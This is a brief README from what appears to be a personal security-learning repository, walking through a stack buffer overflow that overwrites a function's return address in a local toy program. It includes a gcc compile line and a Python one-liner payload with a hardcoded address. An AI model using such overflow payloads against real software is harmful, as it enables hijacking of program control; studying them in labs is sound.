# Security in C code

This is a self training/blog for my own learning process of security. Do not
expect expert content since I am NOT a security expert. Feel free to rise bugs
if something is wrong or you would like to explore other security attacks.
Feedback more than welcome.

## Buffer Overflow Exploit Example

This example simply exploit the buffer by smashing the stack and modifying the
return address of the function. This will be used to call some other function.
It is based on this good
[tutorial](https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/) 
[theory](http://www.cis.syr.edu/~wedu/seed/Book/book_sample_buffer.pdf)


```
    $ gcc vuln.c -o vuln -m32 -O0
    $ python2 -c 'print "a"*32 + "\xb2\x84\x04\x08"' | ./vuln
```

